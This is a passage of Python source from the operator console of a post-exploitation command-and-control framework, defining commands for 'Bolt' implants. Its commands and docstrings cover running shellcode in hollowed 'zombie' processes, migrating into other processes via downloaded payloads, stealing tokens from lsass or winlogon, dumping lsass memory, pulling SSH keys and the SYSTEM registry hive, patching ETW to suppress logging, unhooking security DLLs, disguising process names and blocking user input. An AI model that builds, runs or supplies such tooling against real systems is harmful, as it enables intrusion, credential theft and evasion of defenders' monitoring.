        Reads the filepath from the local (non-client) filesystem as binary data
        and will run it in memory in a sacrificial suspended process. The zombie
        process binary must exist but can have any arguments.

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        If the file is a compiled DLL, this will convert it to shellcode on the
        server side before being sent to the client.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        Examples:
            zombie /home/hackerman/gibson.bin svchost.exe -k LocalSystemNetworkRestricted -p -s
            zombie /tmp/malware.dll notepad.exe this-file-does-not-exist.txt
            zombie ~/malware.dll -a admin -p Password123 explorer.exe
        """
        if _is_help(a):
            return self.do_help("zombie")
        if len(a) < 2:
            return print(
                "zombie [-x|--detach] [-u user] [-d domain] [-p password] <local_file> <fake_args>"
            )
        r = _PARSERS[0x8].parse_args(a, cat=" ")
        if not nes(r.file):
            return print(
                "zombie [-x|--detach] [-u user] [-d domain] [-p password] <local_file> <fake_args>"
            )
        if not nes(r.args):
            return print(
                "zombie [-x|--detach] [-u user] [-d domain] [-p password] <local_file> <fake_args>"
            )
        if nes(r.user):
            u, d = split_user_domain(r.user, r.domain)
            p = r.pw
        else:
            u, d, p = self._user, self._domain, self._password
        self._exec(
            self.shell.cirrus.task_zombie,
            file=r.file,
            fake_args=r.args,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
            user=u,
            domain=d,
            pw=p,
        )
        del r, u, p, d

    def do_profile(self, n):
        """
        profile <name>

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Sets the client profile to the profile specified by the supplied name.

        Examples:
            profile my-profile
        """
        if len(n) == 0:
            return print("profile <name>")
        self._exec(self.shell.cirrus.task_profile, profile=n)

    def _exec(self, f, **a):
        if not isinstance(a, dict):
            a = dict()
        try:
            f(self.id, **a)
        except (ValueError, TypeError) as err:
            print(f"[!] {err}!")

    def do_elevate(self, v):
        """
        elevate [pid | process_name]

        OS:    Windows
        OPsec: n/a
        Admin: Maybe (depends on target)

        Attempt to steal and use a token from the target process.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the filter commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Examples:
            elevate
            elevate 1337
            elevate lsass.exe
            elevate winlogon.exe
        """
        self._system_filter("elevate", v)

    def do_refresh(self, _):
        """
        refresh

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Refresh the client's system information and return the results back to
        the server.
        """
        self._system("refresh")

    def do_shutdown(self, f):
        """
        shutdown [-f|--force]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Indicates to the current client that it should shutdown and release it's
        resources.

        Pass the "-f" or "--force" to force shutdown and do not ask for confirmation.
        """
        try:
            if (not nes(f) or "-f" not in f) and not do_ask(
                "Confirm shutdown of this Bolt"
            ):
                return print("[-] Aborting shutdown!")
            self.shell.cirrus.session_remove(self.id, True)
            print("[+] Triggered Bolt shutdown.")
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._bolts = None

    def do_cp(self, p, dest):
        """
        cp <remote_source> <remote_dest>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Copies a file from the specified remote path to the remote destination.
        The copy will overrite any file present at the destination path.

        Environment variables are processed on the client.

        Examples:
            cp C:/file1 C:/file2
        """
        if not nes(p) or not nes(dest):
            return print("cp <remote_source> <remote_dest>")
        self._exec(self.shell.cirrus.task_copy, src=p, dest=dest)

    def do_mv(self, p, dest):
        """
        mv <remote_source> <remote_dest>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Moves a file from the specified remote path to the remote destination.
        The move will overrite any file present at the destination path.

        Environment variables are processed on the client.

        Examples:
            mv C:/file2 C:/file3
        """
        if not nes(p) or not nes(dest):
            return print("mv <remote_source> <remote_dest>")
        self._exec(self.shell.cirrus.task_move, src=p, dest=dest)

    def do_procname(self, n):
        """
        procname <name>

        OS:    Linux/Unix/BSD
        OPsec: n/a
        Admin: n/a

        Attempts to rename the process arguments to the provided string. The
        value cannot be longer than the current process name and will be silently
        truncated if it's larger.

        Examples:
            procname apache2
            procname [kernel]
        """
        if len(n) == 0:
            return print("procname <name>")
        self._system(f"procname {n}")

    def do_regedit(self, *a):
        """
        regedit <action> [-f|--force] <key> [value] [type] [data]

        OS:    Windows
        OPsec: Maybe (depends on action / logging setup)
        Admin: Maybe (depends on action)

        Retrieve, delete or modify data on the client system's registry.

        The action argument specifies what to do and how many paramaters are
        required

        Actions:
        get
        |  Retrieve the data and type of the supplied key and value. The "value"
        |  option is required, use an empty string to specify the "(Default)" value.

        ls|dir
        |  Retreive a listing of the keys and values for the supplied key path.
        |  If "value" is specified, this will behave like a "get" action.

        set|edit|update
        |  Set and/or update the registry value. If the value does not exist,
        |  create it. Any keys in the path will also be created. This option
        |  requires the "value" and "type" arguments to be specified, use an empty
        |  string to specify the "(Default)" value. If "data" is omitted, this
        |  will set the value as empty.

        rm|rem|del|delete
        |  Delete the specified key or value (if "value" is not omitted). This
        |  will only delete non-empty keys if the "-f" or "--force" argument is
        |  specified.

        Type can be one of the following:
        - sz|string: "data" must be a string.
        - bin|binary: "data" must be a base64 encoded string.
        - dword|uint32: "data" must be a integer.
        - qword|uint64: "data" must be a integer.
        - multi|multi_sz: "data" must be a string, separate multiple entries with
          '\\n' (newline).
        - exp_sz|expand_string: "data" must be a string

        The "key" argument takes both "reg.exe" and PowerShell registry hive
        name conventions (ex: "HKLM:\\System" and "HKLM\\System" are equal.)

        If "key" or "value" have spaces, they must be enclosed in single or
        double quotes.

        Examples:
            regedit del "HKCU:\\Control Panel\\Desktop\\My Key"
            regedit set "HKCU:\\Control Panel\\Desktop" "Wallpaper" string "C:\\lol.jpg"
            regedit ls "HKCU:\\System\\CurrentControlSet\\Services"
        """
        if _is_help(a):
            return self.do_help("regedit")
        if len(a) < 2:
            return print(
                "regedit <ls|get|set|del> [-f|--force] <key> [value] [type] [data]"
            )
        r = _PARSERS[0xA].parse_args(a)
        if not nes(r.action) or not nes(r.key):
            return print(
                "regedit <ls|get|set|del> [-f|--force] <key> [value] [type] [data]"
            )
        self._exec(
            self.shell.cirrus.task_registry,
            action=r.action.lower(),
            key=r.key,
            value=r.value,
            type=r.exp,
            data=r.data,
            force=r.force,
        )
        del r

    def do_rev2self(self, _):
        """
        rev2self

        OS:    Windows
        OPsec: n/a
        Admin: n/a

        Revert the token status to before any impersonation occurred. This would
        be used to reset permissions after finished with an "elevate" command.
        """
        self._system("rev2self")

    def do_set_hide(self, v):
        """
        set_hide [boolean]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Enable/Disable global shell command visibility. If no option is specified,
        command windows are hidden. Can take multiple types of boolean values
        ("true", "T", "t", "yes", "y", "enable", "e", "1").

        Examples:
            set_hide
            set_hide no
            set_hide true
        """
        n = True
        if len(v) > 0:
            n = is_true(v)
        n = not n
        print(f"[+] Set Show Window: {self.show} => {n}.")
        c = self.show != n
        self.show = n
        del n
        return c

    def do_write(self, d, p):
        """
        write <string> <remote_path>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Write the supplied string contents to the remote path. This will overrite
        the contents if the current path exists.

        Examples:
            write "hello world!" C:/hello.txt
        """
        if not nes(p):
            return print("write <string> <remote_path>")
        if not isinstance(d, str):
            d = ""
        self._exec(
            self.shell.cirrus.task_upload, target=None, dest=p, raw=d.encode("UTF-8")
        )

    def do_migrate(self, *a):
        """
        migrate <pipe> [file]
        |       [-m|--method]     <method>
        |       [-t|--target]     <process_name | pid>
        |       [-n|--profile     <profile>
        |       [-f|--args]       <args>
        |       [-a|--agent]      <user-agent>
        |       [-R|--no-reflect]
        |       [-u|--user]       <[domain\\]user[@domain]>
        |       [-d|--domain]     <domain>
        |       [-p|--password]   <password>
        |       [-z|--no-auto]

        OS:    Any
        OPsec: Not Safe! (If a local file without reflect is used), Disk Write
        Admin: Maybe (depends on method/target)

        Migrate control to another process using a type of method. The method can
        be specified by the "-m" argument.

        The "pipe" argument is required and specifies what pipe name to use to
        connect to the new instance. (However if the "-P/--pipe" argument was
        specified at runtime or through the "DOPPLER_PIPE" environment variable
        the pipe value will be inferred from there and it may be omitted. This
        action can be disable using thr "-z/--no-auto" argument.) The pipe value
        is most likely compiled into the client.

        If any DLL or ASM files are specified using the Doppler command line, the
        file will be used if no file path is specified. Doppler will perfer the ASM
        payload over DLL, if specified. If no method is specified, it will default
        to ASM or DLL if a file is specified.

        By default, the current profile will be used, but can be changed by
        specifying the name with the "-p" argument.

        If the method is "self", "exec" or "exe" the additional "-u", "-p" and
        "-d" arguments may be used to change the user the process is executed as.
        See the "runas" command for more info.

        The following methods are valid:

        dll
        |  Use the "file" specified as a DLL migration method. This method requires
        |  a target to be specified as the host for the DLL. By default, if the
        |  "-R" or "--no-reflect" arguments are NOT supplied, this will convert
        |  the DLL to assembly before sending it to the client. Otherwise the
        |  DLL file will be written to disk before loading.
        |
        |  If a remote path is used instead, the "-R" and "--no-reflect" arguments
        |  are ignored.

        asm
        |  Use the "file" specified as assembly migrate code. This method requires
        |  a target to be specified as the host for the shellcode. If the "file"
        |  path is a DLL, this will convert the DLL to assembly before sending it
        |  to the client.

        exec|exe
        |  Execute a command as the migrate method. This is the default option
        |  if a method is not specified. If the special value "self" is used, this
        |  will use the current client binary path to execute instead.

        pexec|url
        |  Download a payload and execute it as a migrate method. This works
        |  similar to the "dex" command and follows the same content rules.
        |  This method will be automatically selected if a URL is detected and
        |  no method is specified. To force the usage of this method, use "pexec"
        |  or "url" as the "-m" argument value.
        |
        |  Similar to the "dex" command, the "-a" or "--agent" argument may be
        |  used to change the User-Agent used from the default value. See the
        |  "dex" or "pull" command for more info.
        |
        |  If a target is specified and the downloaded type requires a target, it
        |  will be used, otherwise a random process will be chosen.
        |
        |  If the download type is a command type the parent can be controlled by
        |  the parent filter, which can be updated with the filter commands. By
        |  default the parent will be the current client process if not set.

        zombie
        |  Use the "file" specified as assembly migrate code in a zombified process.
        |  This method requires a command to be used as the host, supplied using the
        |  "-f" argument. The running binary must exist but the arguments may be
        |  random/invalid. If the "file" path is a DLL, this will convert the DLL
        |  to assembly before sending it to the client.
        |
        |  The parent of the zombie process can be controlled by the parent filter,
        |  which can be updated with the filter commands. By default the parent
        |  will be the current client process if not set.

        The arguments for this command are similar to the "spawn" command.

        Examples:
            migrate pipe-me self
            migrate -m exec pipe-me
            migrate -p my_profile -m dll pipe-me ~/implant.dll
            migrate pipe-me http://path.to.shell.code
            migrate -m url pipe-me path.to.shell.code
            migrate -p my_profile -m asm ~/bolt.bin
            migrate -m zombie -f notepad.exe ~/implant.dll
            migrate -m self -u admin -p Password123 derp-me
        """
        if _is_help(a):
            return self.do_help("migrate")
        if len(a) < 1:
            return print('Use "migrate -h" for helptext')
        r = _PARSERS[0x6].parse_args(a)
        if nes(self.shell.pipe) and not r.no_auto:
            if not nes(r.file) and nes(r.pipe):
                r.file = r.pipe
                r.pipe = self.shell.pipe
                print(_MenuBolt._AUTO_PIPE.format(pipe=self.shell.pipe))
            elif not nes(r.pipe):
                r.pipe = self.shell.pipe
                print(_MenuBolt._AUTO_PIPE.format(pipe=self.shell.pipe))
        if not nes(r.pipe):
            return print("[!] migrate: invalid/missing pipe name")
        f = self.filter
        if nes(r.target):
            f = _quick_filter(r.target)
        try:
            m, c = _get_callable(
                "migrate", self.show, r, self.shell.asm, self.shell.dll
            )
        except (ValueError, OSError) as err:
            return print(f"[!] {err}!")
        self._exec(
            self.shell.cirrus.task_migrate,
            pipe=r.pipe,
            method=m,
            profile=r.profile,
            exec=c,
            filter=f,
        )
        del f, m, c, r

    def do_wallpaper(self, p):
        """
        wallpaper <[!]local_file | remote_file>

        OS:    Any
        OPsec: Not Safe! (Only if a local file is used), Disk Write
        Admin: Maybe (depends on action)

        Changes the current user's wallpaper. The behavior of this command is
        affected by the path specified.

        If the path is prefixed with an exclamation point "!", attempts to
        |  read the file locally will occur and will fail if the file is not
        |  found. Otherwise, the file contents will be loaded into memory and
        |  sent to the client. The wallpaper will be saved to disk before setting
        |  the new wallpaper.

        If the path does NOT start with an exclamation point, the initial
        |  search will happen locally and if the path exists, the above block will
        |  occur instead, otherwise the path will be sent to the client to load
        |  the path directly from disk.

        Examples:
            wallpaper ~/troll.png
            wallpaper C:/Windows/web/web1.jpg
        """
        if len(p) == 0:
            return print("wallpaper <!local_file|remote_path>")
        self._exec(self.shell.cirrus.task_wallpaper, file=p)

    def do_zerotrace(self, _):
        """
        zerotrace

        OS:    Windows
        OPsec: Safe
        Admin: No

        Attempts to prevent any ETW/Debugging logs by NOP-ing/RET-ing the
        ETW event and debugging Windows API function calls.

        Once this function returns successfully, there is no need to run it again.
        """
        self._system("zerotrace")

    def do_check_dll(self, d):
        """
        check_dll <dll_name | dll_path>

        OS:    Windows
        OPsec: Safe-ish (Some system DLLs are monitored for Open)
        Admin: No

        Inspect the memory region of the supplied DLL name or path to determine
        if any hooks are present.

        A DLL name, such as ntdll, kernel32 or shell32 for example may be
        specified. If a path is specified, the full path may be omitted if the
        DLL is a well known DLL, such as shell32.

        The ".dll" extension may also be omitted regardless of full path or name.

        Examples:
            check_dll ntdll
            check_dll ntdll.dll
            check_dll C:/Windows/SysWOW64/shell32.dll
            check_dll C:/Windows/SysWOW64/user32
        """
        if len(d) == 0:
            return print("check_dll <dll_name|dll_path>")
        if not d.endswith(".dll"):
            d = d + ".dll"
        self._system(f"check-dll {d}")

    def do_upload(self, f, p):
        """
        upload <local_file> <remote_path>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Upload a local file to the client at the supplied remote_path.

        Environment variables are processed on the client (for the remote_path).

        Examples:
            upload ~/hacker_file.txt C:/file.txt
            upload note.txt $USERPROFILE/Desktop/note.txt
        """
        if not nes(f) or not nes(p):
            return print("upload <local_file> <remote_path>")
        self._exec(self.shell.cirrus.task_upload, target=f, dest=p)

    def do_troll(self, a, arg):
        """
        troll <action> [arg]

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on action)

        Performs a "troll" action. Many of these can be used to annoy/frustrate
        the current user. Some actions may require elevated privileges.

        If no enable/disable is specified, this commands defaults to "enable".

        The following are valid actions:

        bi, block_input:
        |  Blocks all user input (including the mouse), rending the console useless.
        |  This requires elevated privileges.

        hc, high_contrast:
        |  Swaps the current Windows theme to the high contrast theme.

        sm, swap_mouse:
        |  Swaps the left and right mouse buttons.

        Examples:
            troll sm
            troll hc false
            troll block_input
        """
        if not nes(a):
            return print("troll <action> [enable|disable]")
        if a[0] == "w" or a[0] == "w":
            if nes(arg):
                try:
                    return self._exec(
                        self.shell.cirrus.task_troll, action=a, arg1=int(arg)
                    )
                except ValueError:
                    return print("[!] WTF argument must be a number of seconds!")
            return self._exec(self.shell.cirrus.task_troll, action=a, arg1=None)
        self._exec(
            self.shell.cirrus.task_troll, action=a, arg1=not nes(arg) or is_true(arg)
        )

    def do_parent_pid(self, v):
        """
        parent_pid [pid]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Set the global parent filter PID. If the PID argument is omitted or empty,
        the PID value is cleared.

        PID settings on filters take precedence over all other settings.

        This command changes the behavior of all command based functions and will
        attempt to target the specified PID. If the PID no longer exists, all
        commands ran will fail with an error.

        Examples:
            parent_pid
            parent_pid 1337
        """
        if self.filter is None:
            self.filter = Filter()
        c = False
        if len(v) == 0:
            c = self.filter.pid is not None
            self.filter.pid = None
        else:
            try:
                p = int(v)
            except ValueError:
                return print(f'[!] PID "{v}" is not a valid integer!')
            if p <= 0:
                return print("[!] PID must be greater than zero!")
            c = self.filter.pid != c
            self.filter.pid = p
            del p
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_screenshot(self, d):
        """
        screenshot [output_file]

        OS:    Windows
        OPsec: Safe
        Admin: No

        Takes a screenshot of the current desktop. This may fail if the client
        is running in a service context. The file is saved as a PNG to the
        supplied local path. If the path is empty, or omitted, a path based
        on the current directory and the Bolt ID will be used instead.

        Examples:
            screenshot
            screenshot ~/screenshot-1.png
        """
        self._system("screenshot", out=d)

    def do_reload_dll(self, d):
        """
        reload_dll <dll_name | dll_path>

        OS:    Windows
        OPsec: Safe-ish (Some system DLLs are monitored for Open)
        Admin: No

        Overwrite the memory region of the specified DLL with the contents on the
        filesystem, eliminating any hooks placed on DLL functions.

        A DLL name, such as ntdll, kernel32 or shell32 for example may be
        specified. If a path is specified, the full path may be omitted if the
        DLL is a well known DLL, such as shell32.

        The ".dll" extension may also be omitted regardless of full path or name.

        Examples:
            reload_dll ntdll
            reload_dll ntdll.dll
            reload_dll C:/Windows/SysWOW64/shell32.dll
            reload_dll C:/Windows/SysWOW64/user32
        """
        if len(d) == 0:
            return print("reload_dll <dll_name|dll_path>")
        if not d.endswith(".dll"):
            d = d + ".dll"
        self._system(f"reload-dll {d}")

    def do_download(self, f, p):
        """
        download <remote_file> [local_path]

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on target)

        Download a remote file. If the local path is non-empty and not omitted,
        the downloaded contents will be saved to that local path. Otherwise the
        contents of the file will be displayed on screen, similar to the "cat"
        command.

        Environment variables are processed on the client (for the remote_path).

        Examples:
            download /root/.ssh/id_rsa ~/keys.pem
            download C:/important-file.txt
            download C:/Windows/system32/config/SYSTEM system.reg
        """
        if not nes(f):
            return print("download <remote_file> [local_path]")
        self._exec(self.shell.cirrus.task_download, target=f, dest=p)

    def do_procdump(self, v, o):
        """
        procdump [pid | process_name]

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on target)

        Dump the memory of a target process.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the filter commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Examples:
            procdump
            procdump 1337
            procdump httpd
            procdump lsass.exe
        """
        self._system_filter("procdump", v, o)

    def do_parent_name(self, v):
        """
        parent_name [name1,name2,nameX...]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Set the global parent filter included target names. These represent the
        process names that CAN be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that matches one (case-insensitive)
        or more in the supplied list. If none are found, all commands ran will
        fail with an error.

        This function is an alias of "parent_include" and inverse of "parent_exclude".

        Examples:
            parent_name
            parent_name explorer.exe
            parent_name winlogon.exe,lsass.exe
        """
        return self.do_parent_include(v)

    def do_check_debug(self, _):
        """
        check_debug

        OS:    Any
        OPsec: Safe
        Admin: No

        Checks if the client process is being debugged. Returns true if a debugger
        is present, false otherwise.
        """
        self._system("check-debug")

    def prompt(self, args=None):
        self.id = args
        self.filter = None
        self._user, self._domain, self._password = "", "", ""
        print(
            f"Entering interactive shell for Bolt {args}.\nDefault execution is ",
            end="",
        )
        if self.shell.no_default_run:
            print('disabled. Execution can only occur with "run", "shell" or "pwsh".')
        else:
            print("enabled.")
        return f" > Bolts > {args} > "

    def do_make_token(self, *a):
        """
        make_token [-d|--domain domain] <[domain\\]user[@domain]> [password]

        OS:    Any
        OPsec: Maybe (Network/ETW logs?)
        Admin: No

        Perform a network login with the supplied credentials. The command will
        NOT use any stored credentials and will only use the credentials specified.

        This allows for any commands/access outside of the local device to be
        authenticated as the target user. The current process username will NOT
        change as this only affects REMOTE resources.

        If a domain is not specified with "-d" or "--domain", it will be parsed
        from the username. Common domain prefixes/suffixes are recognized, such
        as:

        - user@domain
        - domain/user
        - domain\\user

        If a domain is found, the username will be cleaned (without the domain)
        and use and the domain will be used as the new domain value.

        Examples:
            make_token alice
            make_token bob Password123
            make_token corp\\bob Password123
            make_token -d example.com joe password1
        """
        if _is_help(a):
            return self.do_help("make_token")
        if len(a) == 0:
            return print("make_token [-d domain] <user> [password]")
        r = _PARSERS[0x4].parse_args(a, nones=False)
        if not nes(r.user):
            return print("make_token [-d domain] <user> [password]")
        u, d = split_user_domain(r.user, r.domain)
        self._exec(self.shell.cirrus.task_login, user=u, domain=d, pw=r.pw)
        del u, d, r

    def do_parent_clear(self, _):
        """
        parent_clear

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Clears the global parent filter.

        This command changes the behavior of all command based functions and will
        set the filter behavior back to the default (native).
        """
        if self.filter is None or self.filter.is_empty():
            self.filter = None
            return False
        self.filter.clear()
        self.filter = None
        print("[+] Parent Filter Cleared.")
        return True

    def complete_job(self, n, *_):
        return self.shell.cache.jobs(self.id, n, False)

    def do_parent_desktop(self, v):
        """
        parent_desktop [boolean]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Set the global parent filter desktop/session target. A "true" value
        represents a process that is running in a user session and most likely
        has a desktop. "false" values target processes that do NOT have a desktop,
        such as services or lsass.exe.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and will
        attempt to target a process with the desktop/filter option chosen (if set).
        If none are found, all commands ran will fail with an error.

        Examples:
            parent_desktop
            parent_desktop no
            parent_desktop true
        """
        if self.filter is None:
            self.filter = Filter()
        r = None
        if len(v) > 0:
            r = is_true(v)
        c = self.filter.session != r
        self.filter.session = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_parent_include(self, v):
        """
        parent_include [name1,name2,nameX...]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Set the global parent filter included target names. These represent the
        process names that CAN be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that matches one (case-insensitive)
        or more in the supplied list. If none are found, all commands ran will
        fail with an error.

        Inverse of "parent_exclude".

        Examples:
            parent_include
            parent_include explorer.exe
            parent_include winlogon.exe,lsass.exe
        """
        if self.filter is None:
            self.filter = Filter()
        r = _split_list(v)
        c = self.filter.include != r
        self.filter.include = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_parent_exclude(self, v):
        """
        parent_exclude [name1,name2,nameX...]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Set the global parent filter excluded target names. These represent the
        process names that CANNOT be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that does not match (case-insensitive)
        any in the supplied list. If none are found, all commands ran will fail
        with an error.

        Inverse of "parent_include".

        Examples:
            parent_exclude
            parent_exclude explorer.exe
            parent_exclude winlogon.exe,lsass.exe
        """
        if self.filter is None:
            self.filter = Filter()
        r = _split_list(v)
        c = self.filter.exclude != r
        self.filter.exclude = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def completenames(self, n, *_):
        return _menu(n, _MenuBolt._MENU)

    def complete_help(self, n, *_):
        return _menu(n, _MenuBolt._MENU)

    def do_parent_elevated(self, v):
        """
        parent_elevated [boolean]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Set the global parent filter elevation target. A "true" value represents
        a process that is running in a system or high integrity. "false" values
        target processes that run with lower than high integrity (non-elevated).

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and will
        attempt to target a process with the elevation option chosen (if set).
        If none are found, all commands ran will fail with an error.

        Examples:
            parent_elevated
            parent_elevated no
            parent_elevated true
        """
        if self.filter is None:
            self.filter = Filter()
        r = None
        if len(v) > 0:
            r = is_true(v)
        c = self.filter.elevated != r
        self.filter.elevated = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_parent_fallback(self, v):
        """
        parent_fallback [boolean]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Set the global parent filter fallback setting. A "true" value indicates
        that this parent filter can fallback to less restrictive settings if the
        first run did not find any valid targets. "false" values disable the
        ability for fallbacks to occur.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and
        while less restrictive on targets, this provides better protection from
        command failures if a target is not found.

        Examples:
            parent_fallback
            parent_fallback no
            parent_fallback true
        """
        if self.filter is None:
            self.filter = Filter()
        r = None
        if len(v) > 0:
            r = is_true(v)
        c = self.filter.fallback != r
        self.filter.fallback = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def complete_window(self, n, *_):
        return _menu(n, ACTIONS_WINDOW)

    def complete_script(self, n, *_):
        return self.shell.cache.scripts(n)

    def complete_proxy(self, n, c, *_):
        if len(c) == 0:
            return _EMPTY
        if c.count(" ") == 3:
            return self.shell.cache.profiles(n)
        return _EMPTY

    def complete_troll(self, n, c, *_):
        if len(c) == 0:
            return _EMPTY
        if c.count(" ") == 1:
            return _menu(n, ACTIONS_TROLL)
        if c.count(" ") == 2:
            return _menu(n, _TOGGLES)
        return _EMPTY

    def complete_profile(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return _EMPTY

    def complete_regedit(self, n, c, *_):
        if len(c) == 0:
            return _EMPTY
        if c.count(" ") == 1:
            return _menu(n, ACTIONS_REG)
        return _EMPTY

    def _system_filter(self, c, v, out=None):
        if not nes(v):
            return self._system(c)
        if "/" in v or "\\" in v or v.endswith(".dmp"):
            return self._system(c, out=v)
        self._system(c, out=out, filter=_quick_filter(v))

    def _run(self, name, detach, append, *a):
        if _is_help(a):
            return self.do_help(name)
        if len(a) == 0:
            return print(
                f"{name} [-x detach] [-u user] [-d domain] [-p password] <command>"
            )
        r = _PARSERS[0xB].parse_args(a, cat=" ")
        if not nes(r.command):
            return print(
                f"{name} [-x detach] [-u user] [-d domain] [-p password] <command>"
            )
        if nes(r.user):
            u, d = split_user_domain(r.user, r.domain)
            p = r.pw
        else:
            u, d, p = self._user, self._domain, self._password
        i = None
        if r.file:
            if not nes(append):
                return print('[!] Invalid command to use "file" with!')
            v = expanduser(expandvars(r.command))
            if not isfile(v):
                return print(f'[!] File "{r.command}" not found!')
            try:
                with open(v) as f:
                    i = f.read()
            except OSError as err:
                return print(f"[!] {err}!")
            del v
            if not nes(i):
                return print(f'[!] File "{r.command}" is empty!')
            r.command = append
        elif nes(append):
            r.command = append + r.command
        self._exec(
            self.shell.cirrus.task_execute,
            cmd=r.command,
            show=self.show,
            detach=detach or r.detach,
            filter=self.filter,
            stdin=i,
            user=u,
            domain=d,
            pw=p,
        )
        del i, r, u, d, p

    def _system(self, c, filter=None, out=None):
        if filter is None:
            return self._exec(
                self.shell.cirrus.task_system, cmd=c, out=out, filter=self.filter
            )
        self._exec(self.shell.cirrus.task_system, cmd=c, out=out, filter=filter)

    def do_window(self, a, handle, arg1, arg2, arg3, arg4):
        """
        window <action> [handle | all | * | 0] [args..]

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on target)

        Performs an Windows window manager action. The supplied "handle" argument
        is optional for the "ls" and "get" calls and can be replaced with "all"
        (or "0"), which will target all top level windows currently open when the
        command executes.

        Window handles do not change unless the window is closed/reopened, so they
        may be reused without an additional call to "window ls".

        The following are valid actions:

        ls, get
        |  Retrieves the list of windows to choose from. This command also retrives
        |  the window position, title and size.

        cl, close
        |  Close the target window(s) using a WM_DESTROY message. The "all", "*"
        |  or "0" handle may be used for this comand to select all current windows.

        dis, disable
        |  Disables a window. This prevents the user from interacting with the
        |  window itself. The "all", "*" or "0" handle may be used for this
        |  comand to select all current windows.

        en, enable
        |  Enables a window. This allows a previously disabled window to be used
        |  again after a disable command. The "all", "*" or "0" handle may be used
        |  for this comand to select all current windows.

        fg, focus
        |  Focuses the window and brings user input to it. This command requires
        |  a handle and can only be used on a single window at a time.

        mb, msg, msgbox, message, messagebox
        |  Show a MessagBox prompt as a child of the supplied window handle. A
        |  handle of 0 (or using 'all') will make a standalone MessageBox.
        |  Using '-1' or 'desktop' will attempt to target the current Desktop.
        |
        |  The first argument is the MessageBox title, which is the only required
        |  argument. The second argument is the message content and the third is
        |  the dialog type, which is an int flag. Both of these are optional and
        |  will default to "" and 0.

        mv, pos, move, size, resize
        |  Moves the target window. This is a function that does not allow "all"
        |  "*" or 0 to be specified as the target can only be a single window.
        |
        |  The arguments to this command are the new X and Y position and the last
        |  two arguments are the optional new width and height which if omitted,
        |  will not change the window size.
        |
        |  The value '-1' can also be used in place for either the 'x' and 'y' or
        |  the 'width' and 'height' to ignore setting that value and leaving it
        |  as the current value.

        sw, show
        |  Sets the window visibility state. The argument to this action is the
        |  visibility state. A number of a Sw* name may be used (without the "Sw"),
        |  such as "minimized" or "maximized". The "all", "*" or "0" handle may
        |  be used for this comand to select all current windows.

        tr, trans, transparent
        |  Sets the transparency level of the window as an argument. This value
        |  may be 0 (completely transparent) to 255 (opaque).
        |
        |  This value may be specified as a percentage with "%" instead which
        |  the level will be computed from. If no value is specified, zero
        |  (transparent) is assumed.
        |
        |  The "all", "*" or "0" handle may be used for this comand to select all
        |  current windows.

        Examples:
            window ls
            window dis all
            window enable 6DF26
            window transparent 3763A6 50%
